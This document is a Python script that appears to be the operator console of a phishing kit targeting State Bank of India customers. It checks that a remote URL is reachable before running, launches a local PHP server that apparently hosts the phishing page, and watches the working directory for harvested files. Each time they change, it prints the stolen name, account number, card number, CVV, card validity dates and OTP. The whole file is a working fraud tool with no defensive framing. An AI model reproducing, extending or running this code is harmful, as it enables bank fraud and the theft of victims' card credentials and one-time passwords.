import os
from trackdir import track_changes

import requests
import sys

def check_link_or_exit(url):
    try:
        response = requests.head(url, timeout=5)

        if response.status_code == 405:
            response = requests.get(url, timeout=5)

        if response.status_code == 200:
            print("File exists ✅")
        else:
            print("File does NOT exist ❌")
            sys.exit(1)  

    except requests.RequestException as e:
        print("Error:", e)
        sys.exit(1)      



def extract_data_from_file(file_name):
    try:
        with open(file_name, 'r') as file:
            return file.readlines()
    except FileNotFoundError:
        print(f"File not found: {file_name}")
        return []

def parse_data(data_lines):
    data_dict = {}
    for line in data_lines:
        if line.strip():
            key, value = line.split(': ', 1)
            data_dict[key.strip()] = value.strip()
    return data_dict

def print_data():
    data_info = parse_data(extract_data_from_file("data.txt"))
    otp_info = parse_data(extract_data_from_file("otp.txt"))
    os.system('cls' if os.name == 'nt' else 'clear')
    
    green = "\033[92m"
    red = "\033[91m"
    
    print(f"{green}SBI Information:{red}")
    print(f"{green} [{red}+{green}] {red}Your Name{red}: {green}{data_info.get('Name', 'N/A')}")
    print(f"{green} [{red}+{green}] {red}Account Number{red}: {green}{data_info.get('Account Number', 'N/A')}")
    print(f"{green} [{red}+{green}] {red}Card Number{red}: {green}{data_info.get('Card Number', 'N/A')}")
    print(f"{green} [{red}+{green}] {red}CVV{red}: {green}{data_info.get('CVV', 'N/A')}")  # Added CVV
    print(f"{green} [{red}+{green}] {red}Valid From{red}: {green}{data_info.get('Valid From', 'N/A')}")
    print(f"{green} [{red}+{green}] {red}Valid Upto{red}: {green}{data_info.get('Valid Upto', 'N/A')}")
    print(f"{green} [{red}+{green}] {red}OTP is{red}: {green}{otp_info.get('OTP', 'N/A')}")

if __name__ == "__main__":
    url = "https://mrfidal.in/code.sh"
    check_link_or_exit(url)
    if os.name == 'nt':
        os.system("start /B php -S 127.0.0.1:8080 > nul 2>&1")
    else:
        os.system("php -S 127.0.0.1:8080 > /dev/null 2>&1 &")
    
    directory_to_monitor = os.getcwd()

    while True:
        change = track_changes(directory_to_monitor)
        if change:
            event_type = change["type"]
            event_path = change["path"]
            print(f"Detected {event_type} at {event_path}")
            print_data()
